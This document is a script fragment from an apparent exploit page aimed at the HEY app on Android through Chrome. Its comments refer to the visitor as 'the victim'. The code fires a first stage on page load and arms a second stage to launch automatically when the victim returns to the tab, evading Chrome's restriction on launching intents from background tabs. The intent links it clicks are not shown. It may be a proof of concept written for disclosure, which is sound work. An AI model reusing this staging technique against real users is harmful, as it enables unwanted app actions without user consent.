<script>
// One click gets the victim here. Stage 1 fires on load, which brings HEY to the
// front; Chrome will not launch an intent from a backgrounded tab, so stage 2 is
// armed and fires by itself the moment this page is visible again - i.e. as soon
// as the victim presses Back on the blank HEY screen.
var done = {1:false, 2:false};
function log(s){ var li=document.createElement("li"); li.textContent=s; document.getElementById("log").appendChild(li); }
function fire(n){
  if (done[n]) return;
  done[n] = true;
  log("firing stage " + n);
  document.getElementById("s" + n).click();
}
setTimeout(function(){ fire(1); }, 700);
function armed(){
  if (!done[1] || done[2]) return;
  if (document.visibilityState !== "visible") return;
  document.getElementById("msg").textContent = "Finishing\u2026";
  setTimeout(function(){ fire(2); }, 400);
}
document.addEventListener("visibilitychange", armed);
window.addEventListener("pageshow", armed);
window.addEventListener("focus", armed);
</script>
